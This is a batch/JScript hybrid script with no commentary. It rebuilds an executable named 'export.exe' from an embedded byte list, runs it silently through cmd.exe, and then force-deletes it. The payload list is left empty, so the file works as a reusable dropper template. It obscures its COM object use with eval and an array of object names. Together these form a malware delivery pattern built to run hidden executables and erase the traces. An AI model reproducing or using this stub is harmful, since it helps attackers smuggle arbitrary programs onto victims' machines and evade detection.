@if (@CodeSection == @Batch) @then
@echo off
set JSCall=Cscript //nologo //E:JScript "%~F0"
for /f "usebackq delims==" %%I IN (`%JSCall%`) DO (set VAR=%%I)
echo export file: %VAR%
del %VAR% /F
goto :EOF

End @CodeSection == @Batch

@end

// JScript section
var _obj = ["Scripting.FileSystemObject","WScript.shell"];
var filename = "export.exe";
var _A = eval("ActiveXObject");
var _cmd = function(_str){
	var _sh = new _A(_obj[1]);
	var _q =_sh.Run("cmd.exe /c " + _str + " & exit",1,true);
}

function writeAllBytes(path, a) {
	var out="";
	var fso, f;
	for(var i=0;i<a.length;i++) out += String.fromCharCode(a[i]);
	fso = new _A(_obj[0]);
	f = fso.OpenTextFile(path, 2, true); 
	f.Write(out);
	f.close();
 return 0;
}

//*{
var exec_file=""
//}*

var fso = new _A(_obj[0]);
if(!fso.FileExists(filename))
	writeAllBytes(filename, exec_file.split(","));
_cmd(filename);
// return stdout
WScript.Echo(filename);
//set batch errorlevel=0
WScript.Quit(0);